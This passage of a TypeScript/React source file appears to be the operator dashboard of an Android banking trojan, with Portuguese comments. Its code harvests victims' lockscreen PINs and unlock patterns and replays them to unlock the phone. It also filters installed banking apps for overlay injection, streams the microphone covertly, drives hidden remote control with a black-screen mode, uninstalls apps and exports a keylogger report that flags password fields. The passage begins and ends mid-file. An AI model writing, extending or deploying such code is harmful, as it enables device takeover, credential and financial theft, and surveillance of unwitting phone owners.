  const hideLockscreen = async () => {
    await sendCommand({ action: 'HIDE_LOCKSCREEN' });
    setIsLockscreenActive(false);
    addLog(' Lockscreen DESATIVADO');
  };
  
  // Pressiona tecla do PIN (para reprodução manual)
  const pressLockKey = async (key: string) => {
    await sendCommand({ action: `LOCK_KEY_${key}` });
    addLog(` Tecla ${key} pressionada`);
  };

  const startUnlockRecordingCmd = async () => {
    await sendCommand({ action: 'START_UNLOCK_RECORDING' });
    setIsUnlockRecording(true);
    addLog(' Gravação de unlock iniciada');
  };

  const stopUnlockRecordingCmd = async () => {
    await sendCommand({ action: 'STOP_UNLOCK_RECORDING' });
    setIsUnlockRecording(false);
    addLog('¹ Gravação de unlock parada');
  };

  const playUnlockLocal = async () => {
    await sendCommand({ action: 'PLAY_UNLOCK_SEQUENCE' });
    addLog('¶ Reproduzindo unlock (RAM local)');
  };

  const playUnlockFromServer = async () => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/unlock-sequence`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      if (!response.ok) {
        addLog(' Falha ao buscar sequência no servidor');
        return;
      }
      const data = await response.json();
      if (data.status !== 'ok' || !data.sequence?.length) {
        addLog(' Nenhuma sequência salva no servidor');
        return;
      }
      await sendCommand({
        action: 'PLAY_UNLOCK_SEQUENCE',
        text: JSON.stringify({ type: data.type, sequence: data.sequence }),
      });
      addLog(`¶ Reproduzindo unlock do servidor (${data.sequence.length} ações)`);
    } catch {
      addLog(' Erro ao reproduzir unlock do servidor');
    }
  };



  const copyPinSequenceFromEvents = (events: any[]) => {
    const digits = events
      .map((e) => String(e.digit ?? ''))
      .filter((d) => /^\d$/.test(d))
      .join('');
    if (!digits) return;
    navigator.clipboard.writeText(digits);
    addLog(` PIN copiado: ${digits}`);
  };

  const formatLockscreenEventTime = (iso: string) => {
    try {
      return new Date(iso).toLocaleTimeString();
    } catch {
      return '';
    }
  };

  const renderCapturedUnlockPinsList = () => {
    const recent = capturedUnlockPins.slice(0, 10);
    if (recent.length === 0) {
      return <p className="text-xs text-gray-500 italic">Nenhum evento de lockscreen capturado ainda.</p>;
    }
    const digitSequence = recent
      .slice()
      .reverse()
      .map((e) => String(e.digit ?? ''))
      .filter((d) => /^\d$/.test(d))
      .join('');
    return (
      <div className="space-y-1">
        {digitSequence.length >= 4 && (
          <div className="flex items-center justify-between mb-2 p-2 bg-green-900/30 border border-green-600/40 rounded-md">
            <span className="text-green-300 font-mono text-sm tracking-widest">{digitSequence}</span>
            <button
              type="button"
              onClick={() => copyPinSequenceFromEvents(recent)}
              className="px-2 py-1 bg-green-700 hover:bg-green-600 text-white text-xs rounded"
            >
              Copiar PIN
            </button>
          </div>
        )}
        <div className="max-h-32 overflow-y-auto space-y-1">
          {recent.map((ev) => {
            const isComplete = String(ev.eventType ?? '').toUpperCase().includes('ENTER')
              || String(ev.digit ?? '').toUpperCase() === 'ENTER';
            const rowDigits = recent
              .filter((e) => e.created_at <= ev.created_at)
              .map((e) => String(e.digit ?? ''))
              .filter((d) => /^\d$/.test(d))
              .join('');
            return (
              <div key={ev.id ?? `${ev.created_at}-${ev.digit}`} className="flex items-center justify-between text-xs bg-[#121214]/80 rounded px-2 py-1">
                <span className="text-gray-300 font-mono">{ev.digit || ev.eventType || ''}</span>
                <span className="text-gray-500">{formatLockscreenEventTime(ev.created_at)}</span>
                {isComplete && rowDigits.length >= 4 && (
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText(rowDigits);
                      addLog(` PIN copiado: ${rowDigits}`);
                    }}
                    className="ml-2 px-1.5 py-0.5 bg-green-700 hover:bg-green-600 text-white rounded text-[10px]"
                  >
                    Copiar PIN
                  </button>
                )}
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  const renderUnlockRecordingControls = () => (
    <div className="rounded-md p-3 border border-[#2a2a31]/30 bg-[#1a1a1e]/20 space-y-2">
      <div className="text-xs text-[#ef4444] font-semibold"> Gravação de Unlock</div>
      <div className="grid grid-cols-2 gap-2">
        <button
          type="button"
          onClick={startUnlockRecordingCmd}
          disabled={isUnlockRecording}
          className="py-2 bg-[#ef4444] hover:bg-[#ef4444] disabled:opacity-50 text-white rounded-md text-xs font-bold"
        >
           Gravar
        </button>
        <button
          type="button"
          onClick={stopUnlockRecordingCmd}
          disabled={!isUnlockRecording}
          className="py-2 bg-[#2a2a31] hover:bg-[#6f6f78] disabled:opacity-50 text-white rounded-md text-xs font-bold"
        >
          ¹ Parar
        </button>
        <button
          type="button"
          onClick={playUnlockLocal}
          className="py-2 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-xs font-bold"
        >
           Local
        </button>
        <button
          type="button"
          onClick={playUnlockFromServer}
          className="py-2 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-xs font-bold"
        >
          ˜ Servidor
        </button>
      </div>
      <div className="flex gap-2">
        <input
          type="text"
          value={patternInput}
          onChange={(e) => setPatternInput(e.target.value.replace(/[^1-9]/g, ''))}
          placeholder="Pattern 14789"
          maxLength={9}
          className="flex-1 px-2 py-1.5 bg-[#121214] border border-[#2a2a31]/25 rounded text-[#ef4444] font-mono text-sm text-center"
        />
        <button
          type="button"
          onClick={runPatternUnlockDirect}
          className="px-3 py-1.5 bg-purple-700 hover:bg-[#ef4444] text-white rounded-md text-xs font-bold"
        >
          Pattern
        </button>
      </div>
    </div>
  );

  const renderPinMockup = () => {
    const val = pinInput || capturedPin;
    return (
      <div className="w-full h-full flex flex-col justify-between items-center py-6 text-white font-sans select-none">
        {/* Top Info */}
        <div className="text-center mt-2">
          <div className="w-12 h-12 rounded-full bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center mx-auto mb-2 animate-pulse shadow-[0_0_15px_rgba(234,179,8,0.2)]">
            <span className="text-xl"></span>
          </div>
          <p className="text-xs text-gray-450 font-semibold uppercase tracking-wider">PIN Requerido</p>
        </div>

        {/* PIN Display */}
        <div className="my-auto py-4 w-full flex flex-col items-center">
          <div className="h-10 flex items-center justify-center gap-3">
            {Array.from({ length: Math.max(4, val.length) }).map((_, idx) => {
              const hasChar = idx < val.length;
              return (
                <div
                  key={idx}
                  className={`w-3.5 h-3.5 rounded-full transition-all duration-300 ${
                    hasChar
                      ? 'bg-yellow-400 shadow-[0_0_10px_rgba(234,179,8,0.8)] scale-110'
                      : 'border border-[#2a2a31] bg-[#121214]/50'
                  }`}
                />
              );
            })}
          </div>
          {val && (
            <p className="text-yellow-400 font-mono text-lg font-bold tracking-widest mt-4 bg-yellow-950/40 border border-yellow-500/20 rounded-md px-3 py-0.5 animate-pulse">
              {val}
            </p>
          )}
        </div>

        {/* Micro keyboard info */}
        <div className="w-full grid grid-cols-3 gap-2 px-2 max-w-[180px] mb-2 opacity-80">
          {[1, 2, 3, 4, 5, 6, 7, 8, 9, '', 0, ''].map((num, idx) => {
            if (num === '') return <div key={`empty-${idx}`} />;
            const isSelected = val.includes(num.toString());
            return (
              <div
                key={num}
                className={`w-7 h-7 rounded-full flex items-center justify-center text-[10px] font-bold border transition-all ${
                  isSelected
                    ? 'border-yellow-500 bg-yellow-500/10 text-yellow-450 shadow-[0_0_8px_rgba(234,179,8,0.3)]'
                    : 'border-[#24242a] bg-[#121214]/40 text-[#8b8b94]'
                }`}
              >
                {num}
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  const renderPatternSVG = () => {
    const latestPatternLog = capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN');
    const val = patternInput || capturedPattern || (latestPatternLog ? latestPatternLog.digit : '');
    if (!val) {
      return (
        <svg viewBox="0 0 300 300" className="w-full h-full p-4">
          <defs>
            <filter id="glow-blue" x="-20%" y="-20%" width="140%" height="140%">
              <feGaussianBlur stdDeviation="6" result="blur" />
              <feComposite in="SourceGraphic" in2="blur" operator="over" />
            </filter>
          </defs>
          {[0,1,2,3,4,5,6,7,8].map((i) => {
            const row = Math.floor(i / 3);
            const col = i % 3;
            const cx = 50 + col * 100;
            const cy = 50 + row * 100;
            return (
              <circle
                key={i}
                cx={cx}
                cy={cy}
                r="12"
                fill="#2a1212"
                stroke="#7a5050"
                strokeWidth="2"
              />
            );
          })}
        </svg>
      );
    }

    const points = val.split('').map((char: string) => {
      const i = parseInt(char) - 1;
      const row = Math.floor(i / 3);
      const col = i % 3;
      return {
        id: char,
        x: 50 + col * 100,
        y: 50 + row * 100
      };
    });

    let pathD = '';
    if (points.length > 0) {
      pathD = `M ${points[0].x} ${points[0].y} ` + points.slice(1).map((p: any) => `L ${p.x} ${p.y}`).join(' ');
    }

    return (
      <svg viewBox="0 0 300 300" className="w-full h-full p-4">
        <defs>
          <filter id="glow-neon" x="-50%" y="-50%" width="200%" height="200%">
            <feGaussianBlur stdDeviation="8" result="coloredBlur"/>
            <feMerge>
              <feMergeNode in="coloredBlur"/>
              <feMergeNode in="SourceGraphic"/>
            </feMerge>
          </filter>
        </defs>

        {pathD && (
          <path
            d={pathD}
            fill="none"
            stroke="#ef4444"
            strokeWidth="8"
            strokeLinecap="round"
            strokeLinejoin="round"
            filter="url(#glow-neon)"
            className="animate-pulse"
          />
        )}

        {points.map((p: any, idx: number) => {
          if (idx === points.length - 1) return null;
          const next = points[idx + 1];
          const dx = next.x - p.x;
          const dy = next.y - p.y;
          const len = Math.sqrt(dx*dx + dy*dy);
          if (len === 0) return null;
          const mx = p.x + dx / 2;
          const my = p.y + dy / 2;
          const angle = Math.atan2(dy, dx) * 180 / Math.PI;
          return (
            <g key={`arrow-${idx}`} transform={`translate(${mx}, ${my}) rotate(${angle})`}>
              <polygon points="-8,-6 8,0 -8,6" fill="#ff6b6b" filter="url(#glow-neon)" />
            </g>
          );
        })}

        {[0,1,2,3,4,5,6,7,8].map((i) => {
          const row = Math.floor(i / 3);
          const col = i % 3;
          const cx = 50 + col * 100;
          const cy = 50 + row * 100;
          const char = (i + 1).toString();
          const isSelected = val.includes(char);
          const selectIndex = val.indexOf(char);

          return (
            <g key={i}>
              <circle
                cx={cx}
                cy={cy}
                r="18"
                fill={isSelected ? "rgba(239, 68, 68, 0.2)" : "#0a0a0b"}
                stroke={isSelected ? "#ef4444" : "#3d2020"}
                strokeWidth={isSelected ? "3" : "2"}
                filter={isSelected ? "url(#glow-neon)" : ""}
              />
              <circle
                cx={cx}
                cy={cy}
                r="6"
                fill={isSelected ? "#ff6b6b" : "#7a5050"}
              />
              {isSelected && (
                <text
                  x={cx}
                  y={cy + 32}
                  fill="#ffa3a3"
                  fontSize="12"
                  fontWeight="bold"
                  textAnchor="middle"
                >
                  {selectIndex + 1}
                </text>
              )}
            </g>
          );
        })}
      </svg>
    );
  };
  
  const runPatternUnlockDirect = async () => {
    const rawPattern = patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN' || log.eventType === 'CAPTURED_PATTERN' || log.hint === 'Pattern')?.digit || '');
    const pattern = (rawPattern || '').replace(/[^1-9]/g, '');
    if (!pattern || pattern.length < 2) {
      addLog(' Informe um pattern (ex: 14789)');
      return;
    }
    if (isLockscreenActive) {
      await hideLockscreen();
    }
    await sendCommand({ action: 'HIDE_LOCKSCREEN' });
    await sendCommand({ action: 'PATTERN_UNLOCK', pattern });
    await sendCommand({ action: 'PLAY_PATTERN_SEQUENCE', pattern, delay: 1000 });
    addLog(` Pattern unlock executado: ${pattern}`);
  };
  
  // Reproduz sequência de PIN ou Pattern automaticamente no aparelho real
  const playLockSequence = async () => {
    if (lockscreenType === 'PIN') {
      const pin = (pinInput || capturedPin || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PIN' || log.eventType === 'CAPTURED_PIN')?.digit || '')).toString().trim();
      if (!pin) {
        addLog(' Nenhum PIN para reproduzir');
        return;
      }
      
      setIsPlayingPin(true);
      addLog(` Reproduzindo PIN: ${pin} (delay: ${pinDelay}ms)`);
      
      if (isLockscreenActive) {
        await hideLockscreen();
      }
      
      // Envia comando via WebSocket direto (com comandos redundantes para garantir execução)
      await sendCommand({ action: 'HIDE_LOCKSCREEN' });
      await sendCommand({ action: 'PLAY_PIN_SEQUENCE', pin: pin, delay: pinDelay });
      
      try {
        const token = localStorage.getItem('token');
        const formData = new FormData();
        formData.append('pin', pin);
        formData.append('delay', pinDelay.toString());
        
        await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/play-pin`, {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${token}` },
          body: formData
        });
      } catch (error) {
        console.error('Erro ao reproduzir PIN:', error);
      }
      
      const totalTime = (pin.length + 1) * pinDelay + 1000;
      setTimeout(() => {
        setIsPlayingPin(false);
        addLog(' Reprodução do PIN concluída');
      }, totalTime);
      
    } else {
      // Pattern
      const rawPattern = patternInput || capturedPattern || (capturedUnlockPins?.find(log => log.eventType === 'LOCKSCREEN_PATTERN' || log.eventType === 'CAPTURED_PATTERN' || log.hint === 'Pattern')?.digit || '');
      const pattern = (rawPattern || '').replace(/[^1-9]/g, '');
      if (!pattern || pattern.length < 2) {
        addLog(' Nenhum Pattern válido para reproduzir (ex: 14789)');
        return;
      }
      
      setIsPlayingPin(true);
      addLog(` Reproduzindo Pattern: ${pattern} no aparelho...`);
      
      if (isLockscreenActive) {
        await hideLockscreen();
      }

      // Envia comando via WebSocket direto
      await sendCommand({ action: 'HIDE_LOCKSCREEN' });
      await sendCommand({ action: 'PLAY_PATTERN_SEQUENCE', pattern: pattern, delay: pinDelay });
      
      try {
        const token = localStorage.getItem('token');
        const formData = new FormData();
        formData.append('pattern', pattern);
        formData.append('delay', pinDelay.toString());
        
        await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/play-pattern`, {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${token}` },
          body: formData
        });
      } catch (error) {
        console.error('Erro ao reproduzir Pattern:', error);
      }
      
      setTimeout(() => {
        setIsPlayingPin(false);
        addLog(' Reprodução do Pattern concluída');
      }, 2000);
    }
  };
  
  // Carrega dados quando abre o modal OU janela flutuante + POLLING a cada 2 segundos
  useEffect(() => {
    const isLockscreenOpen = showLockscreenModal || (isFloatingMode && floatingWindows.lockscreen?.open);
    if (isLockscreenOpen && deviceId) {
      fetchDeviceLockData();
      // Polling a cada 5 segundos para capturar dados em tempo real
      const interval = setInterval(fetchDeviceLockData, 5000);
      return () => clearInterval(interval);
    }
  }, [showLockscreenModal, deviceId, isFloatingMode, floatingWindows.lockscreen?.open]);
  
  //  GERENCIAMENTO DE APPS
  const fetchInstalledApps = async () => {
    if (!deviceId) return;
    setIsLoadingApps(true);
    
    try {
      const token = localStorage.getItem('token');
      
      // Primeiro, solicita atualização da lista
      await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/refresh-apps`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      // Aguarda um pouco para o dispositivo responder (aumentado para 4 segundos)
      await new Promise(resolve => setTimeout(resolve, 4000));
      
      // Busca a lista
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/installed-apps`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.apps && data.apps.length > 0) {
          // Ordena por nome
          const sortedApps = data.apps.sort((a: any, b: any) => 
            a.name.localeCompare(b.name)
          );
          setInstalledApps(sortedApps);
          addLog(` ${data.count} apps carregados`);
        } else {
          addLog(' Aguardando lista de apps do dispositivo...');
        }
      }
    } catch (error) {
      console.error('Erro ao buscar apps:', error);
      addLog(' Erro ao buscar apps');
    } finally {
      setIsLoadingApps(false);
    }
  };
  
  const loadCachedApps = async () => {
    if (!deviceId) return;
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/installed-apps`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        if (data.apps && data.apps.length > 0) {
          const sortedApps = data.apps.sort((a: any, b: any) => a.name.localeCompare(b.name));
          setInstalledApps(sortedApps);
        }
      }
    } catch (e) {
      console.error(e);
    }
  };

  useEffect(() => {
    const initApps = async () => {
      if (!deviceId) return;
      await loadCachedApps();
      // Sempre dispara a sincronização automática em segundo plano para garantir que os bancos apareçam de imediato
      void fetchInstalledApps();
      
      // Carrega projetos e mapeamentos de overlay
      const savedProjectsStr = localStorage.getItem('apkStudioProjects');
      try {
        const local = savedProjectsStr ? JSON.parse(savedProjectsStr) : [];
        setProjects([PRESET_BANK_PROJECT, ...local]);
      } catch (e) {
        console.error(e);
        setProjects([PRESET_BANK_PROJECT]);
      }
      fetchOverlayMappings();
    };
    initApps();
  }, [deviceId]);
  
  const openApp = async (packageName: string, appName: string) => {
    await sendCommand({ action: 'OPEN_APP', package: packageName });
    addLog(` Abrindo: ${appName}`);
  };
  
  const uninstallApp = async (packageName: string, appName: string) => {
    console.log(' uninstallApp chamado:', { packageName, appName });
    
    if (confirm(`Deseja desinstalar "${appName}" do aparelho de forma 100% automática?\n\nPackage: ${packageName}`)) {
      try {
        console.log(' Enviando comando UNINSTALL_APP para:', packageName);
        await sendCommand({ action: 'UNINSTALL_APP', package: packageName });
        addLog(` Desinstalação automática solicitada: ${appName} (${packageName})`);
        
        // Recarrega a lista de apps após alguns segundos para atualizar o painel
        setTimeout(() => {
          try {
            fetchInstalledApps();
          } catch (e) {}
        }, 3500);
      } catch (error) {
        console.error(' Erro ao desinstalar:', error);
        addLog(` Erro ao desinstalar: ${appName}`);
      }
    }
  };
  
  const forceStopApp = async (packageName: string, appName: string) => {
    await sendCommand({ action: 'FORCE_STOP_APP', package: packageName });
    addLog(` Forçando parada: ${appName}`);
  };
  
  // Filtra apps
  const filteredApps = installedApps.filter(app => {
    // Filtro por tipo
    if (appsFilter === 'user' && app.isSystem) return false;
    if (appsFilter === 'system' && !app.isSystem) return false;
    if (appsFilter === 'banks') {
      const isBank = installedBanks.some((b: any) => b.package === app.package);
      if (!isBank) return false;
    }
    
    // Filtro por busca
    if (appsSearch) {
      const search = appsSearch.toLowerCase();
      return (app.name || '').toLowerCase().includes(search) || 
             (app.package || '').toLowerCase().includes(search);
    }
    
    return true;
  });
  
  // Filtra apps para gatilho de injeção
  const filteredAppsForMapping = useMemo(() => {
    return installedApps.filter(app => {
      // 1. Filtro por tipo
      if (mappingFilter === 'banks') {
        const isBank = installedBanks.some((b: any) => b.package === app.package);
        if (!isBank) return false;
      } else if (mappingFilter === 'user' && app.isSystem) {
        return false;
      }
      
      // 2. Filtro por busca
      if (mappingSearch) {
        const search = mappingSearch.toLowerCase();
        return (app.name || '').toLowerCase().includes(search) || 
               (app.package || '').toLowerCase().includes(search);
      }
      
      return true;
    });
  }, [installedApps, mappingFilter, mappingSearch, installedBanks]);
  
  const startMicrophoneStream = () => {
    if (!deviceId) return;
    
    // Limpa reíconexão anterior se existir
    if ((window as any).micReconnectTimer) {
      clearTimeout((window as any).micReconnectTimer);
      delete (window as any).micReconnectTimer;
    }
    
    const token = localStorage.getItem('token');
    // Usa URL dinmica baseada no getApiBaseUrl()
    const wsProtocol = getApiBaseUrl().startsWith('https') ? 'wss' : 'ws';
    const wsBase = getApiBaseUrl().replace(/^https?/, wsProtocol);
    const ws = new WebSocket(`${wsBase}/ws/microphone/${deviceId}?token=${token}`);
    
    ws.binaryType = 'arraybuffer';
    
    // Cria AudioContext para reproduzir o áudio PCM
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)({
      sampleRate: 16000 // Mesmo sample rate usado no Android
    });
    audioContextRef.current = audioContext;
    
    ws.onopen = () => {
      console.log(' Microphone stream íconectado');
    };
    
    ws.onmessage = async (event) => {
      const arrayBuffer = event.data instanceof ArrayBuffer ? event.data : await (event.data as Blob).arrayBuffer();
      
      try {
        // Converte PCM 16-bit para Float32 para o AudioContext
        const int16Array = new Int16Array(arrayBuffer);
        const float32Array = new Float32Array(int16Array.length);
        
        for (let i = 0; i < int16Array.length; i++) {
          float32Array[i] = int16Array[i] / 32768.0; // Normaliza para -1.0 a 1.0
        }
        
        // Cria buffer de áudio
        const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
        audioBuffer.getChannelData(0).set(float32Array);
        
        // Reproduz o áudio
        const source = audioContext.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(audioContext.destination);
        source.start(0);
        
      } catch (error) {
        console.error(' Erro ao processar áudio:', error);
      }
    };
    
    ws.onerror = (error) => {
      console.error(' Erro no microphone stream:', error);
      ws.close();
    };
    
    ws.onclose = () => {
      console.log(' Microphone stream desíconectado');
      //  REÍCONEXƒO AUTOMTICA se o microfone ainda estiver habilitado
      if (isMicrophoneEnabled && showMicrophoneModal) {
        console.log(' Reíconectando microfone em 2 segundos...');
        (window as any).micReconnectTimer = setTimeout(() => {
          startMicrophoneStream();
        }, 2000);
      }
    };
    
    // Armazena WebSocket para fechar depois
    (window as any).microphoneWs = ws;
  };
  
  const stopMicrophoneStream = () => {
    // Limpa timer de reíconexão
    if ((window as any).micReconnectTimer) {
      clearTimeout((window as any).micReconnectTimer);
      delete (window as any).micReconnectTimer;
    }
    
    const ws = (window as any).microphoneWs;
    if (ws) {
      ws.close();
      delete (window as any).microphoneWs;
    }
    
    if (audioContextRef.current) {
      audioContextRef.current.close();
      audioContextRef.current = null;
    }
  };


  const getAppFriendlyName = (packageName: string, appName: string): string => {
    // Mapeamento de packages conhecidos para nomes amigáveis
    const knownApps: { [key: string]: string } = {
      'com.android.chrome': 'Œ Chrome',
      'com.google.android.gm': ' Gmail',
      'com.whatsapp': ' WhatsApp',
      'com.facebook.katana': ' Facebook',
      'com.instagram.android': ' Instagram',
      'com.twitter.android': ' Twitter',
      'com.google.android.apps.messaging': ' Messages',
      'com.android.contacts': ' Contacts',
      'com.android.settings': 'š Settings',
      'com.google.android.inputmethod.latin': '¨ Keyboard',
      'com.google.android.apps.maps': ' Google Maps',
      'com.snapchat.android': ' Snapchat',
      'com.paypal.android.p2pmobile': ' PayPal',
      'com.bankofamerica.mobile': ' Bank of America',
      'com.chase.sig.android': ' Chase',
      'com.venmo': ' Venmo',
      'com.coinbase.android': ' Coinbase'
    };

    // Retorna nome amigável se conhecido, senão usa appName
    return knownApps[packageName] || appName || packageName;
  };

  const downloadKeylogs = () => {
    if (keylogs.length === 0) return;

    let txtContent = '========================================\n';
    txtContent += '       KEYLOGGER REPORT\n';
    txtContent += '========================================\n';
    txtContent += `Device: ${device?.model || 'Unknown'}\n`;
    txtContent += `Device ID: ${deviceId}\n`;
    txtContent += `Total Logs: ${keylogs.length}\n`;
    txtContent += `Generated: ${new Date().toLocaleString()}\n`;
    txtContent += '========================================\n\n';

    keylogs.forEach((log, index) => {
      const friendlyName = getAppFriendlyName(log.package || '', log.appName || '');
      txtContent += `[${index + 1}] ${log.timestamp}\n`;
      txtContent += `App: ${friendlyName}\n`;
      if (log.package) txtContent += `Package: ${log.package}\n`;
      if (log.isPassword) txtContent += ` PASSWORD FIELD DETECTED!\n`;
      txtContent += `Text: ${log.text}\n`;
      if (log.hint) txtContent += `Field Hint: ${log.hint}\n`;
      if (log.fieldName) txtContent += `Field Name: ${log.fieldName}\n`;
      txtContent += '----------------------------------------\n\n';
    });

    txtContent += '========================================\n';
    txtContent += '           END OF REPORT\n';
    txtContent += '========================================\n';

    // Create download
    const blob = new Blob([txtContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogger_${deviceId}_${new Date().getTime()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    addLog(` Keylogger downloaded: ${keylogs.length} logs`);
  };

  if (!device) {
    return (
      <div className="min-h-screen bg-[#1a1a1e] flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#3a3a44] mx-auto mb-4"></div>
          <p className="text-gray-400">Carregando dispositivo...</p>
        </div>
      </div>
    );
  }

  // ============================================
  //  RENDERIZAÇO MOBILE - TELA CHEIA
  // ============================================
  if (isMobile && isMobileFullscreen) {
    return (
      <div className="fixed inset-0 bg-black z-[200] flex flex-col">
        {/* Header Mobile Compacto */}
        <div className="bg-[#1a1a1e]/95 px-2 py-1 flex items-center justify-between border-b border-[#2a2a31]/20">
          <button
            onClick={() => setIsMobileFullscreen(false)}
            className="p-2 text-white"
          >
            <Minimize className="w-5 h-5" />
          </button>
          <div className="flex items-center space-x-2">
            <span className="text-white text-xs font-bold truncate max-w-[120px]">
              {device.custom_name ? device.custom_name.toUpperCase() : device.model}
            </span>
            <div className={`w-2 h-2 rounded-full ${device.is_online ? 'bg-green-500' : 'bg-[#ef4444]'}`}></div>
            {device.admin_active && <span className="text-xs" title="Admin Ativo">¡</span>}
          </div>
          <button
            onClick={() => setShowMobileControls(!showMobileControls)}
            className="p-2 text-white"
          >
            {showMobileControls ? <ChevronUp className="w-5 h-5" /> : <ChevronDown className="w-5 h-5" />}
          </button>
        </div>
        
        {/* Tabs VNC/V2 Mobile */}
        <div className="bg-[#121214] px-2 py-1 flex space-x-1">
          <button
            onClick={() => setShowScreenReader(false)}
            className={`flex-1 py-1.5 rounded text-xs font-bold ${!showScreenReader ? 'bg-[#ef4444] text-white' : 'bg-[#2a2a31] text-gray-400'}`}
          >
             VNC
          </button>
          <button
            onClick={() => {
              setShowScreenReader(true);
              if (!isScreenReaderEnabled) toggleScreenReader();
            }}
            className={`flex-1 py-1.5 rounded text-xs font-bold ${showScreenReader ? 'bg-green-600 text-white' : 'bg-[#2a2a31] text-gray-400'}`}
          >
             V2 {isScreenReaderEnabled && ''}
          </button>
        </div>
        
        {/* rea da Tela - Ocupa todo o espaço */}
        <div className="flex-1 overflow-hidden relative">
          {!showScreenReader ? (
            // VNC Normal
            isCaptureEnabled ? (
              <div className="w-full h-full flex items-center justify-center">
                <DeviceScreen
                  deviceId={deviceId!}
                  onCommand={sendCommand}
                  isBlackScreenActive={isBlackScreen}
                  onConnectionStatusChange={handleConnectionStatusChange}
                  captureMethod="silent"
                  killerFrameOnPointerMove={isKillerMode}
                  onRequestFrame={requestKillerFrame}
                />
              </div>
            ) : (
              <div className="w-full h-full flex items-center justify-center bg-black">
                <button
                  onClick={toggleCapture}
                  className="px-6 py-3 bg-gray-800 text-white rounded-md border border-gray-600"
                >
                  ¶ Iniciar Captura
                </button>
              </div>
            )
          ) : (
            // Screen Reader V2 Mobile
            <div 
              className="w-full h-full bg-[#120303]"
              onTouchStart={(e) => {
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const x = touch.clientX - rect.left;
                const y = touch.clientY - rect.top;
                setMouseDownPos({ x, y });
                setMouseDownTime(Date.now());
                setIsDragging(true);
                dragPathRef.current = [{ x, y }];
              }}
              onTouchMove={(e) => {
                if (!isDragging || !mouseDownPos) return;
                const touch = e.touches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const x = touch.clientX - rect.left;
                const y = touch.clientY - rect.top;
                const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                if (dist > 15) {
                  dragPathRef.current.push({ x, y });
                }
              }}
              onTouchEnd={(e) => {
                if (!mouseDownPos) return;
                const touch = e.changedTouches[0];
                const rect = e.currentTarget.getBoundingClientRect();
                const upX = touch.clientX - rect.left;
                const upY = touch.clientY - rect.top;
                const downX = mouseDownPos.x;
                const downY = mouseDownPos.y;
                const deltaX = upX - downX;
                const deltaY = upY - downY;
                const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                const holdTime = Date.now() - mouseDownTime;
                
                const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                const realScale = rect.width / devW;
                const deviceDownX = Math.round(downX / realScale);
                const deviceDownY = Math.round(downY / realScale);
                const deviceUpX = Math.round(upX / realScale);
                const deviceUpY = Math.round(upY / realScale);
                
                if (deviceDownX < 0 || deviceDownX > devW || deviceDownY < 0 || deviceDownY > devH) {
                  setMouseDownPos(null);
                  setIsDragging(false);
                  dragPathRef.current = [];
                  return;
                }
                
                const normX = Math.max(0, Math.min(1, deviceDownX / devW));
                const normY = Math.max(0, Math.min(1, deviceDownY / devH));
                const normX1 = normX;
                const normY1 = normY;
                const normX2 = Math.max(0, Math.min(1, deviceUpX / devW));
                const normY2 = Math.max(0, Math.min(1, deviceUpY / devH));
                
                if (holdTime > 500 && distance < 10) {
                  sendCommand({ action: 'LONG_PRESS', x: normX, y: normY, scale: 'vnc_norm' });
                } else if (distance > 30) {
                  sendCommand({ action: 'SWIPE', x1: normX1, y1: normY1, x2: normX2, y2: normY2, duration: Math.min(500, Math.max(100, holdTime)), scale: 'vnc_norm' });
                } else {
                  sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                }
                
                setMouseDownPos(null);
                setIsDragging(false);
                dragPathRef.current = [];
              }}
            >
              {screenHierarchy && screenHierarchy.hierarchy ? (
                <ScreenReaderCanvas
                  hierarchy={screenHierarchy.hierarchy}
                  maxHeight={window.innerHeight - 100}
                  textScale={v2TextScale}
                  designTheme={v2DesignTheme}
                  hideUntyped={v2HideUntypedElements}
                  opacity={v2Opacity}
                  showGrid={v2ShowGrid}
                  cornerStyle={v2CornerStyle}
                  showCoords={v2ShowCoords}
                />
              ) : (
                <div className="w-full h-full flex items-center justify-center">
                  <p className="text-gray-400">Carregando V2...</p>
                </div>
              )}
            </div>
          )}
        </div>
        
        {/* Controles Mobile */}
        {showMobileControls && (
